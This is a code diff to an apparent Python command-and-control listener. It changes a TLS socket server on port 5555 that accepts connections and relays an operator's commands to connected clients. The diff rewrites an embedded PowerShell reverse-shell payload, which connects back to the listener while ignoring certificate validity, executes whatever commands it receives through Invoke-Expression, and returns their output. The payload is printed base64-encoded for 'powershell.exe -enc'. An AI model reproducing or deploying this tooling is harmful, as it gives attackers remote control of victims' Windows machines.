@@ -17,16 +17,19 @@ def startListener():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         ws = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1, certfile="server.crt", keyfile="server.key", server_side=True)
     except:
-        print t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Rerun ./setup.py to generate certs" + t.normal + '\n>')
+        sys.stdout.flush()
         sys.exit(1)
     try:
         ws.bind((FUNCTIONS().CheckInternet(), 5555))
         ws.listen(30)
     except:
-        print t.bold_red + "[*] Error with listener - Port in use" + t.normal
+        sys.stdout.write('\r' + t.bold_red + "[*] Error with listener - Port in use" + t.normal + '\n>')
+        sys.stdout.flush()
         sys.exit(1)
 
-    print t.bold_red + "listening on port 5555" + t.normal
+    sys.stdout.write('\r' + t.bold_red + "listening on port 5555" + t.normal + '\n>')
+    sys.stdout.flush()
     clientnumber = 0
 
     while True:
@@ -34,7 +37,8 @@ def startListener():
         ip , port = address
         if clientconn:
             clientnumber += 1
-            print t.bold_green + "connection from %s %s"%(ip,port) + t.normal
+            sys.stdout.write('\r' + t.bold_green + "connection from %s %s"%(ip,port) + t.normal + '\n>')
+            sys.stdout.flush()
 
             worker = Thread(target=pingClients, args=(clientconn,clientnumber))
             worker.setDaemon(True)
@@ -56,15 +60,16 @@ def interactShell(clientconn,clientnumber):
         if command == "back":
             break
         if command == "exit":
-            print t.bold_red + "Client Connection Killed" + t.normal
-            del clientMenuOptions[str(clientnumber)]
-            clientconn.close()
+            if str(clientnumber) in clientMenuOptions.keys():
+                print t.bold_red + "Client Connection Killed" + t.normal
+                del clientMenuOptions[str(clientnumber)]
+                clientconn.close()
             break
         if command == "":
             continue
         clientconn.sendall(command)
         while True:
-            data = clientconn.recv(1).encode("utf-8")
+            data = clientconn.recv(1)
             sys.stdout.write(data)
             sys.stdout.flush()
             if data == "\x00":
@@ -86,18 +91,19 @@ def clientUpload(fileToUpload,clientconn,powershellExec):
 
 def printListener():
     windows_ps_rev_shell = (
-        "$client = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
-        "$stream = $client.GetStream();"
-        "[byte[]]$bytes = 0..65535|%{0};"
-        "$sslstream = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
-        "$sslstream.AuthenticateAsClient('10.131.101.65',$null,[System.Security.Authentication.SslProtocols]::Tls,$false);"
-        "while(($i = $sslstream.Read($bytes, 0, $bytes.Length)) -ne 0)"
-        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
-        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String);"
-        "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
-        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$sslstream.Write($sendbyte,0,$sendbyte.Length);"
-        "$sslstream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
-    print 'powershell.exe -WindowStyle Hidden -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
+        "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','" + str(5555) + "');"
+        "[byte[]]$b = 0..65535|%{0};"
+        "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
+        "$sl.AuthenticateAsClient('10.131.101.65');"
+        "while($c.Connected){"
+        "$i = $sl.Read($b, 0, $b.Length);"
+        "$sb = New-Object -TypeName System.Text.ASCIIEncoding; $d = $sb.GetString($b,0, $i);"
+        "$cb = (Invoke-Expression -Command $d 2>&1 | Out-String);"
+        "$br = $cb + ($error[0] | Out-String) + \"\x00\";$error.clear();"
+        "$sb = ([text.encoding]::ASCII).GetBytes($br);$sl.Write($sb,0,$sb.Length);"
+        "$sl.Flush()};$c.Close()")
+
+    print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
     return True
 
 def pingClients(clientconn,clientnumber):
@@ -107,6 +113,7 @@ def pingClients(clientconn,clientnumber):
             time.sleep(15)
             clientconn.recv(1)
     except:
-        print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
-        del clientMenuOptions[str(clientnumber)]
+        if str(clientnumber) in clientMenuOptions.keys():
+            print t.bold_red + "Client %s Has Disconnected" % clientnumber + t.normal
+            del clientMenuOptions[str(clientnumber)]
         sys.exit(1)
